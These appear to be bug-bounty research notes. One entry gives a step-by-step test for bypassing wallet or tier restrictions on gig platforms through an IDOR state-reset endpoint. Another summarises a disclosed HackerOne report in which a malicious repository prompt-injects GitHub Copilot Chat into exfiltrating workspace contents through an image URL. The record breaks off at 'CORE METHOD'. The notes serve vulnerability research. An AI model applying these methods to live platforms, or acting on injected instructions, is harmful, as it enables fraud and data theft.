TRANSFERABLE TEST: on ANY gig/ride-hailing/delivery/courier platform — (1) find the endpoint that sets the driver's/rider's availability, location or "online" state and inspect whether it accepts a resource id (`trip_id`, `order_id`, `shift_id`) and whether that id is validated against the caller; (2) find the endpoint that enforces the wallet/balance/tier restriction and note WHEN it is evaluated (at bid time? at state-set time?); (3) with an account under the restriction (negative balance, low tier, suspended), call the state-reset endpoint with an arbitrary/other-user resource id, then immediately call the restricted action (bid / accept trip / claim order); (4) if the restricted action succeeds, the gate was a mutable flag cleared by the state endpoint. Rule: **when a wallet/balance/tier restriction blocks an action, look for the endpoint that RESETS the gating state and check whether it accepts a resource id the caller does not own — a state-reset endpoint with an unbound object id is a restriction bypass.**
DEDUPE: 0 hits across all three write targets for `2868164`, `Bronze`, `negative balance`, `driver/update/location`, `offer/bid`, `wallet restriction`, `pingsudo`, `bugbountywithmarco`. Pre-existing Bykea material REVIEWED as related-but-distinct: #2861888 (an IDOR-able config endpoint returns the hash that authorizes a bid -> forged bid) and #3085742 (IDOR on an in-app hardcoded zombie endpoint) — both are IDOR-on-a-single-endpoint, not a three-endpoint state-reset chain. New general method -> §17.391.

SOURCE: https://hackerone.com/reports/2383092  2026-11-10
ROUTE: the live `.json` route answered HTTP 200; `visibility: no-content` for `vulnerability_information` but the FULL public text is in the `summaries` field — the GitHub team summary (by `s2jeff-gh`, 2024-08-15) and the researcher summary (by `astrounder`, 2024-08-19), both read verbatim this pass. `web_extract` on the report page also rendered both summaries. Route that worked: the live HackerOne `.json` endpoint's `summaries` field.
STATUS: UNVERIFIED (not reproduced — no Copilot session or repository was driven this pass; every step and quote below is verbatim from the two summaries).
CLASS: code injection / sensitive info disclosure with PoC — INDIRECT PROMPT INJECTION into an LLM coding assistant (GitHub Copilot Chat in VS Code / JetBrains) via a malicious cloned repository, where the assistant's output is rendered as HTML in the chat UI and an attacker-controlled image link exfiltrates the workspace contents via URL parameters (HackerOne weakness "Code Injection", severity Low 0.1~3.9 after a bot downgrade from Medium 5.3, reporter `astrounder`, submitted 2024-02-21 / disclosed 2024-08-19, asset GitHub, bounty yes).
CORE METHOD:
